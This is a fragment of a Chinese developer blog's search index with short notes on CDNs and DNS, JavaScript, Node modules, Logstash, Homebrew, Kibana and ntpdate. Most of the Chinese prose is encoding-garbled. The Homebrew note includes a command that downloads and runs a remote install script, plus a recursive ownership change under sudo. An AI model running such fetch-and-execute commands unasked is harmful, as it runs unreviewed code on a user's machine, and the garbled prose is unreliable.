        <content type="html"><![CDATA[<h2 id="CDNåŸç†"><a href="#CDNåŸç†" class="headerlink" title="CDNåŸç†"></a>CDNåŸç†</h2><p><img src="/images/QQ20160815-0@2x.png"></p><ol><li>ç”¨æˆ·å‘æµè§ˆå™¨è¾“å…¥<code>images.frim-x.com</code>è¿™ä¸ªåŸŸåï¼Œæµè§ˆå™¨ç¬¬ä¸€æ¬¡å‘ç°æœ¬åœ°æ²¡æœ‰dnsç¼“å­˜ï¼Œåˆ™å‘ç½‘ç«™çš„DNSæœåŠ¡å™¨è¯·æ±‚ã€‚â‘ </li><li>ç½‘ç«™çš„DNSåŸŸåè§£æå™¨è®¾ç½®äº†<code>CNAME</code>ï¼ŒæŒ‡å‘äº†<code>firm-x.cname.cdn.com</code>,è¯·æ±‚æŒ‡å‘äº†CDNç½‘ç»œä¸­çš„æ™ºèƒ½DNSè´Ÿè½½å‡è¡¡ç³»ç»Ÿã€‚â‘¡</li><li>æ™ºèƒ½CDNâ€™s DNSæœåŠ¡å™¨ï¼Œæ¥æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œä¼šæ ¹æ®ç”¨æˆ·IPæ‰¾åˆ°æœ€åŒ¹é…çš„ä¸€é¡¹ï¼Œå¹¶ä¸”è®¡ç®—è·ç¦»è¿™ä¸ªç”¨æˆ·æœ€è¿‘çš„EdgeæœåŠ¡å™¨ï¼Œå°†è¿™ä¸ªæœ€ä¼˜ç‚¹çš„IPè¿”å›ç»™ç”¨æˆ·ã€‚â‘¢â‘£</li><li>ç”¨æˆ·å‘è¯¥IPèŠ‚ç‚¹ï¼ˆCDNæœåŠ¡å™¨ï¼‰å‘å‡ºè¯·æ±‚ã€‚ç”±äºæ˜¯ç¬¬ä¸€æ¬¡è®¿é—®ï¼ŒCDNæœåŠ¡å™¨ä¼šå‘åŸwebç«™ç‚¹è¯·æ±‚ï¼Œå¹¶ç¼“å­˜å†…å®¹ã€‚è¯·æ±‚ç»“æœå‘ç»™ç”¨æˆ·ã€‚â‘¤</li></ol><p>è¿™é‡Œçš„åŠ é€Ÿçš„æ ¸å¿ƒç‚¹å°±æ˜¯è¿™ä¸ªæ™ºèƒ½è·¯ç”±ï¼Œå®ƒè´Ÿè´£æŠŠç”¨æˆ·å¼•åˆ°æœ€ä¼˜çš„æœåŠ¡å™¨ã€‚</p><h3 id="ç™¾åº¦æ™ºèƒ½DNS"><a href="#ç™¾åº¦æ™ºèƒ½DNS" class="headerlink" title="ç™¾åº¦æ™ºèƒ½DNS"></a>ç™¾åº¦æ™ºèƒ½DNS</h3><ul><li><p>CloudFlare DNS</p><p>  å¯ä»¥çœ‹åˆ°æœ€ç»ˆè§£æå‡ºæ¥çš„Aåœ°å€æœ‰<code>103.235.46.39</code>å’Œ<code>103.235.46.40</code>ä¸¤ä¸ªï¼ˆè¿™ä¸¤ä¸ªåœ°å€éƒ½ä½äºç™¾åº¦é¦™æ¸¯æœºæˆ¿ï¼Œå¯èƒ½å’ŒCloudFlareæœåŠ¡æµ·å¤–ç”¨æˆ·æœ‰å…³ï¼‰ã€‚å¯ä»¥çœ‹å‡ºç»è¿‡ä¸¤çº§<code>CNAME</code>åˆ°æœ€ç»ˆçš„IPã€‚</p><p>  <img src="/images/dig-dns.png"></p><p>  <img src="/images/dig-dns-cname.png"></p><p>  <img src="/images/dig-dns-cname2.png"></p></li><li><p>114 DNS</p><p>  114DNSæœ€ç»ˆè§£æåˆ°çš„åœ°å€æ˜¯<code>180.149.132.151</code>å’Œ<code>180.149.131.98</code>ï¼Œè¿™ä¸¤ä¸ªå°±æ˜¯åŒ—äº¬çš„æœºæˆ¿ã€‚</p><p>  <img src="/images/dig-114-dns.png"></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> cdn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScriptç±»å‹è½¬æ¢</title>
      <link href="/post/javascript-type-conversion.html"/>
      <url>/post/javascript-type-conversion.html</url>
      
        <content type="html"><![CDATA[<h2 id="JavaScriptç±»å‹è½¬æ¢"><a href="#JavaScriptç±»å‹è½¬æ¢" class="headerlink" title="JavaScriptç±»å‹è½¬æ¢"></a>JavaScriptç±»å‹è½¬æ¢</h2><blockquote><p>ç²—ä½“éƒ¨åˆ†æ˜¯è¦æ³¨æ„çš„</p></blockquote><p><img src="/images/QQ20160810-0@2x.png"></p><blockquote><p>å¯¹è±¡è½¬å­—ç¬¦ä¸²ä¼šè°ƒç”¨å®ƒçš„<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/toString">toString()</a>æ–¹æ³•ï¼Œå¯¹è±¡è½¬æ•°å­—ä¼šè°ƒç”¨å…¶<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf">valueOf()</a>æ–¹æ³•ã€‚</p></blockquote><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ol><li>ã€ŠJavaScriptæƒå¨æŒ‡å—ã€‹3.8 ç±»å‹è½¬æ¢</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nodeæ¨¡å—æŸ¥æ‰¾ç­–ç•¥</title>
      <link href="/post/nodejs-module-loader.html"/>
      <url>/post/nodejs-module-loader.html</url>
      
        <content type="html"><![CDATA[<h3 id="Node-jsæ¨¡å—æŸ¥æ‰¾ç­–ç•¥"><a href="#Node-jsæ¨¡å—æŸ¥æ‰¾ç­–ç•¥" class="headerlink" title="Node.jsæ¨¡å—æŸ¥æ‰¾ç­–ç•¥"></a>Node.jsæ¨¡å—æŸ¥æ‰¾ç­–ç•¥</h3><p>é¦–å…ˆåœ¨å½“å‰é¡¹ç›®ä¸­<code>node_modules</code>ç›®å½•ä¸­æ‰¾ï¼Œæ‰¾ä¸åˆ°å»çˆ¶æ–‡ä»¶å¤¹<code>node_modules</code>æ‰¾ï¼Œä¸€ç›´åˆ°æ ¹ç›®å½•ä¸‹çš„<code>node_modules</code>ã€‚</p><p>å¯ä»¥åœ¨é¡¹ç›®ç›®å½•ä¸‹å»ºä¸€ä¸ªæ–‡ä»¶<code>module_path.js</code>ï¼Œå†…ä¸º<code>console.log(module.paths);</code>ã€‚æ‰§è¡Œå®ƒå°±å¯ä»¥çœ‹åˆ°ç±»ä¼¼ä¸‹é¢çš„ç»“æœäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[ &#x27;/Users/doog/Documents/Workspaces/node/node-wxbot/node_modules&#x27;,</span><br><span class="line">  &#x27;/Users/doog/Documents/Workspaces/node/node_modules&#x27;,</span><br><span class="line">  &#x27;/Users/doog/Documents/Workspaces/node_modules&#x27;,</span><br><span class="line">  &#x27;/Users/doog/Documents/node_modules&#x27;,</span><br><span class="line">  &#x27;/Users/doog/node_modules&#x27;,</span><br><span class="line">  &#x27;/Users/node_modules&#x27;,</span><br><span class="line">  &#x27;/node_modules&#x27; ]</span><br></pre></td></tr></table></figure><h4 id="NODE-PATH"><a href="#NODE-PATH" class="headerlink" title="NODE_PATH"></a>NODE_PATH</h4><p>å¦å¤–ï¼Œå¦‚æœåœ¨ä¸Šæ‰€è¯´çš„<code>node_modules</code>ä¸­éƒ½æ²¡æœ‰æ‰¾åˆ°ï¼Œå®ƒä¼šå»çœ‹æœ‰æ²¡æœ‰ä¸€ä¸ªå«<code>NODE_PATH</code>çš„ç¯å¢ƒå˜é‡ã€‚å¦‚æœæœ‰ï¼Œå°±å»å®ƒä¸‹é¢æ‰¾ã€‚<code>NODE_PATH</code>è™½ç„¶å¯ä»¥è§£å†³å®‰è£…çš„ä¾èµ–åŒ…è¿‡å¤šé—®é¢˜ï¼Œä½†æ˜¯ç”¨èµ·æ¥ä¸æ–¹ä¾¿ï¼Œç§»æ¤æ€§ä¸å¥½ã€‚å®¹æ˜“ç»™ä¸äº†è§£çš„äººé€ æˆå›°æƒ‘ï¼Œä¸å»ºè®®ä½¿ç”¨ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>logstash</title>
      <link href="/post/logstash.html"/>
      <url>/post/logstash.html</url>
      
        <content type="html"><![CDATA[<h2 id="Logstash"><a href="#Logstash" class="headerlink" title="Logstash"></a>Logstash</h2><h3 id="é…ç½®ç¤ºä¾‹"><a href="#é…ç½®ç¤ºä¾‹" class="headerlink" title="é…ç½®ç¤ºä¾‹"></a>é…ç½®ç¤ºä¾‹</h3><p>é€‚é…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2016-02-04 00:00:12.653] [INFO] access - pid: 12792 from 101.51.18.127:59983 at: 2016-02-03T16:00:09.516Z - [&quot;Wed, 03 Feb 2016 16:00:09 GMT \&quot;GET /api/dosomething 304 1 ms - - - 1.0\&quot; \&quot;xOXp3I1tHwXMyD2oA0MlWpYqD-PiCBhL 13471600000 171.139.119.147\&quot; \&quot;\&quot; \&quot;Mozilla/5.0 (Linux; Android 4.4.4; 2014811 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\&quot;&quot;]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">    stdin &#123; &#125;</span><br><span class="line">    file &#123;</span><br><span class="line">        path =&gt; [&quot;/root/2016-02-log/access.log-2016-02-04&quot;]</span><br><span class="line">        start_position =&gt; &quot;beginning&quot;</span><br><span class="line">        codec =&gt; multiline &#123;</span><br><span class="line">            pattern =&gt; &quot;^\[&quot;</span><br><span class="line">            negate =&gt; true</span><br><span class="line">            what =&gt; &quot;previous&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    grok &#123;</span><br><span class="line">        match =&gt; &#123;</span><br><span class="line">            &quot;message&quot; =&gt; &quot;\[%&#123;TIMESTAMP_ISO8601&#125;\] \[%&#123;LOGLEVEL:level&#125;\] %&#123;WORD:type&#125; - pid: %&#123;POSINT:pid&#125; from %&#123;IP:host&#125;:%&#123;POSINT:port&#125; at: %&#123;TIMESTAMP_ISO8601&#125; - \[\&quot;%&#123;DAY&#125;, %&#123;MONTHDAY:monthday&#125; %&#123;MONTH:month&#125; %&#123;YEAR:year&#125; %&#123;TIME:time&#125; GMT%&#123;SPACE&#125;?%&#123;ISO8601_TIMEZONE&#125;? \\\&quot;%&#123;WORD:method&#125; %&#123;URIPATHPARAM:http_request&#125; %&#123;INT:http_status_code&#125; (?:%&#123;INT:response_time&#125; ms|-) - (?:%&#123;INT:content_length&#125;|-) - %&#123;NUMBER:http_version&#125;\\&quot; \\&quot;(?:%&#123;NOTSPACE:sid&#125;|NoSessionID) (?:%&#123;INT:mobile&#125;|NoMobile|NoUserInfo) %&#123;IP:remote-addr&#125;\\&quot; \\&quot;%&#123;DATA:referrer&#125;\\\&quot; \\\&quot;%&#123;DATA:user_agent&#125;\\\&quot;\&quot;\]&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        add_field =&gt; &#123;</span><br><span class="line">            &quot;timestamp&quot; =&gt; &quot;%&#123;year&#125;-%&#123;month&#125;-%&#123;monthday&#125; %&#123;time&#125;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    date &#123;</span><br><span class="line">        match =&gt; [&quot;timestamp&quot;,  &quot;YYYY-MMM-dd HH:mm:ss&quot;, &quot;YYYY-MM-dd HH:mm:ss.SSS&quot;, &quot;ISO8601&quot;]  </span><br><span class="line">        locale =&gt; &quot;en-US&quot;  </span><br><span class="line">        remove_field =&gt; [&quot;time&quot; ,&quot;month&quot;, &quot;monthday&quot;, &quot;year&quot;, &quot;timestamp&quot;]  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">output &#123;</span><br><span class="line">    stdout &#123;</span><br><span class="line">        codec =&gt; &quot;json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    file &#123;</span><br><span class="line">        path =&gt; [&quot;/root/logdash-demo/access.log&quot;]</span><br><span class="line">        codec =&gt; &quot;json_lines&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p><a href="http://grokdebug.herokuapp.com/">http://grokdebug.herokuapp.com/</a></p><p><img src="/images/ZErzrBkkjE.gif"></p>]]></content>
      
      
      
        <tags>
            
            <tag> logstash </tag>
            
            <tag> log </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>brew.md</title>
      <link href="/post/brew.html"/>
      <url>/post/brew.html</url>
      
        <content type="html"><![CDATA[<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure><h3 id="æœç´¢ä¸å®‰è£…"><a href="#æœç´¢ä¸å®‰è£…" class="headerlink" title="æœç´¢ä¸å®‰è£…"></a>æœç´¢ä¸å®‰è£…</h3><ol><li><p>æœç´¢</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brew search vi</span><br><span class="line">brew search /æ­£åˆ™è¡¨è¾¾å¼/ # æ ‡å‡†æ ¼å¼</span><br><span class="line">brew search /^vi/   #è§„å®šäº†åªèƒ½æ˜¯viå¼€å¤´</span><br><span class="line">brew search /^vi\\w$/   #è§„å®šåªèƒ½æ˜¯viå¼€å¤´å¹¶ä¸”åªæœ‰ä¸‰ä¸ªå­—æ¯</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£…</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install vim </span><br><span class="line">brew install username/repo/vim</span><br></pre></td></tr></table></figure></li></ol><h3 id="å¸è½½ä¸æ›´æ–°"><a href="#å¸è½½ä¸æ›´æ–°" class="headerlink" title="å¸è½½ä¸æ›´æ–°"></a>å¸è½½ä¸æ›´æ–°</h3><ol><li><p>å¸è½½</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># å¸è½½å¯¹åº”åŒ…åå­—</span><br><span class="line">brew uninstall &lt;package_name&gt;</span><br><span class="line"></span><br><span class="line"># åˆ—å‡ºè¿‡æ—¶çš„åŒ…</span><br><span class="line">brew outdated</span><br></pre></td></tr></table></figure></li><li><p>æ›´æ–°</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># æ›´æ–°è¿‡æ—¶çš„åŒ…ï¼Œä¸å¸¦åŒ…åå°±è·Ÿæ–°æ‰€æœ‰åŒ…</span><br><span class="line">brew upgrade [package_name]</span><br><span class="line"></span><br><span class="line"># è·Ÿæ–°HomeBrewè‡ªèº«</span><br><span class="line">brew update</span><br><span class="line"></span><br><span class="line"># æ¸…é™¤ç¼“å­˜</span><br><span class="line">brew cleanup [package_name]</span><br><span class="line"></span><br><span class="line"># åˆ—å‡ºå·²ç»å®‰è£…çš„åŒ…</span><br><span class="line">brew list</span><br></pre></td></tr></table></figure></li></ol><h3 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h3><p><code>brew</code>å’ŒåŒ…å«çš„åŒ…æºéƒ½æ˜¯é€šè¿‡<code>github</code>æ¥ç®¡ç†ï¼Œäººä¸ºçš„ç»´æŠ¤ç®¡ç†ï¼Œé™¤äº†è‡ªå·±çš„æºè¿˜å…è®¸åˆ«äººçš„æºæ·»åŠ è¿›æ¥ã€‚å¾ˆå¤šæ—¶å€™æœ‰äº›è½¯ä»¶åŒ…å¹¶ä¸åœ¨å®˜æ–¹æä¾›åˆ—è¡¨é‡Œé¢è€Œæ˜¯ç”±ç¬¬ä¸‰æ–¹æä¾›çš„è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew [un]tap &lt;github_userid/repo_name&gt; #æ·»åŠ æˆ–è€…åˆ é™¤ä»“åº“</span><br></pre></td></tr></table></figure><h3 id="æœåŠ¡ç®¡ç†"><a href="#æœåŠ¡ç®¡ç†" class="headerlink" title="æœåŠ¡ç®¡ç†"></a>æœåŠ¡ç®¡ç†</h3><p><a href="https://github.com/Homebrew/homebrew-services">https://github.com/Homebrew/homebrew-services</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">brew services [start|stop|restart] [package_name]</span><br><span class="line"></span><br><span class="line">brew services list</span><br><span class="line"></span><br><span class="line">brew services cleanup</span><br></pre></td></tr></table></figure><h3 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew doctor</span><br></pre></td></tr></table></figure><h3 id="å¸¸è§é—®é¢˜"><a href="#å¸¸è§é—®é¢˜" class="headerlink" title="å¸¸è§é—®é¢˜"></a>å¸¸è§é—®é¢˜</h3><ol><li>In macOS 10.12 Sierra, &#x2F;usr&#x2F;local is readonly<br> <a href="https://maomihz.com/2016/09/upgrade-sierra-homebrew/">å‡çº§macOS Sierraåä¿®å¤brewå¯èƒ½å­˜åœ¨çš„é—®é¢˜</a> <a href="https://github.com/Homebrew/brew/issues/385">In macOS 10.12 Sierra, &#x2F;usr&#x2F;local is readonly.</a> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown -R $(whoami) /usr/local</span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://www.jianshu.com/p/8ad7056b243f">Homebrewæ€»ç»“</a></li><li><a href="http://icyleaf.com/2014/01/homebrew-hidden-commands/">Homebrew éšè—å‘½ä»¤</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> brew </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kibana.md</title>
      <link href="/post/kibana.html"/>
      <url>/post/kibana.html</url>
      
        <content type="html"><![CDATA[<h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Kibana is served by a back end server. This controls which port to use.</span></span><br><span class="line"><span class="comment"># server.port: 5601</span></span><br><span class="line"><span class="attr">server.port:</span> <span class="number">5601</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The host to bind the server to.</span></span><br><span class="line"><span class="comment"># server.host: &quot;0.0.0.0&quot;</span></span><br><span class="line"><span class="attr">server.host:</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If you are running kibana behind a proxy, and want to mount it at a path,</span></span><br><span class="line"><span class="comment"># specify that path here. The basePath can&#x27;t end in a slash.</span></span><br><span class="line"><span class="comment"># server.basePath: &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The maximum payload size in bytes on incoming server requests.</span></span><br><span class="line"><span class="comment"># server.maxPayloadBytes: 1048576</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The Elasticsearch instance to use for all your queries.</span></span><br><span class="line"><span class="comment"># elasticsearch.url: &quot;http://localhost:9200&quot;</span></span><br><span class="line"><span class="attr">elasticsearch.url:</span> <span class="string">&quot;http://elk.my-guide.cc:9200&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># preserve_elasticsearch_host true will send the hostname specified in `elasticsearch`. If you set it to false,</span></span><br><span class="line"><span class="comment"># then the host you use to connect to *this* Kibana instance will be sent.</span></span><br><span class="line"><span class="comment"># elasticsearch.preserveHost: true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Kibana uses an index in Elasticsearch to store saved searches, visualizations</span></span><br><span class="line"><span class="comment"># and dashboards. It will create a new index if it doesn&#x27;t already exist.</span></span><br><span class="line"><span class="comment"># kibana.index: &quot;.kibana&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The default application to load.</span></span><br><span class="line"><span class="comment"># kibana.defaultAppId: &quot;discover&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If your Elasticsearch is protected with basic auth, these are the user credentials</span></span><br><span class="line"><span class="comment"># used by the Kibana server to perform maintenance on the kibana_index at startup. Your Kibana</span></span><br><span class="line"><span class="comment"># users will still need to authenticate with Elasticsearch (which is proxied through</span></span><br><span class="line"><span class="comment"># the Kibana server)</span></span><br><span class="line"><span class="comment"># elasticsearch.username: &quot;user&quot;</span></span><br><span class="line"><span class="comment"># elasticsearch.password: &quot;pass&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SSL for outgoing requests from the Kibana Server to the browser (PEM formatted)</span></span><br><span class="line"><span class="comment"># server.ssl.cert: /path/to/your/server.crt</span></span><br><span class="line"><span class="comment"># server.ssl.key: /path/to/your/server.key</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Optional setting to validate that your Elasticsearch backend uses the same key files (PEM formatted)</span></span><br><span class="line"><span class="comment"># elasticsearch.ssl.cert: /path/to/your/client.crt</span></span><br><span class="line"><span class="comment"># elasticsearch.ssl.key: /path/to/your/client.key</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If you need to provide a CA certificate for your Elasticsearch instance, put</span></span><br><span class="line"><span class="comment"># the path of the pem file here.</span></span><br><span class="line"><span class="comment"># elasticsearch.ssl.ca: /path/to/your/CA.pem</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set to false to have a complete disregard for the validity of the SSL</span></span><br><span class="line"><span class="comment"># certificate.</span></span><br><span class="line"><span class="comment"># elasticsearch.ssl.verify: true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Time in milliseconds to wait for elasticsearch to respond to pings, defaults to</span></span><br><span class="line"><span class="comment"># request_timeout setting</span></span><br><span class="line"><span class="comment"># elasticsearch.pingTimeout: 1500</span></span><br><span class="line"><span class="attr">elasticsearch.pingTimeout:</span> <span class="number">1500</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Time in milliseconds to wait for responses from the back end or elasticsearch.</span></span><br><span class="line"><span class="comment"># This must be &gt; 0</span></span><br><span class="line"><span class="comment"># elasticsearch.requestTimeout: 30000</span></span><br><span class="line"><span class="attr">elasticsearch.requestTimeout:</span> <span class="number">30000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Time in milliseconds for Elasticsearch to wait for responses from shards.</span></span><br><span class="line"><span class="comment"># Set to 0 to disable.</span></span><br><span class="line"><span class="comment"># elasticsearch.shardTimeout: 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Time in milliseconds to wait for Elasticsearch at Kibana startup before retrying</span></span><br><span class="line"><span class="comment"># elasticsearch.startupTimeout: 5000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the path to where you would like the process id file to be created.</span></span><br><span class="line"><span class="comment"># pid.file: /var/run/kibana.pid</span></span><br><span class="line"><span class="attr">pid.file:</span> <span class="string">/var/run/kibana.pid</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If you would like to send the log output to a file you can set the path below.</span></span><br><span class="line"><span class="comment"># logging.dest: stdout</span></span><br><span class="line"><span class="attr">logging.dest:</span> <span class="string">/opt/kibana/logs/kibana.log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set this to true to suppress all logging output.</span></span><br><span class="line"><span class="comment"># logging.silent: false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set this to true to suppress all logging output except for error messages.</span></span><br><span class="line"><span class="comment"># logging.quiet: false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set this to true to log all events, including system usage information and all requests.</span></span><br><span class="line"><span class="comment"># logging.verbose: false</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ—¶é—´åŒæ­¥.md</title>
      <link href="/post/linux-ntpdate.html"/>
      <url>/post/linux-ntpdate.html</url>
      
        <content type="html"><![CDATA[<ol><li>å®‰è£…ntpdate</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum install ntpdate.x86_64</span><br><span class="line"></span><br><span class="line">OR</span><br><span class="line"></span><br><span class="line">apt-get install ntpdate</span><br></pre></td></tr></table></figure><ol start="2"><li>åŒæ­¥æ—¶é—´</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate time.nist.gov</span><br></pre></td></tr></table></figure><ol start="3"><li>å®šæ—¶åŒæ­¥</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># æ¯10åˆ†é’ŸåŒæ­¥ä¸€æ¬¡</span><br><span class="line">crontab -e</span><br><span class="line">*/10 * * * * /usr/sbin/ntpdate time.nist.gov</span><br></pre></td></tr></table></figure><blockquote><p>ntp æœåŠ¡å™¨ä½¿ç”¨udpï¼Œé»˜è®¤ç«¯å£123</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ElasticSearch</title>
      <link href="/post/elasticsearch.html"/>
      <url>/post/elasticsearch.html</url>
      
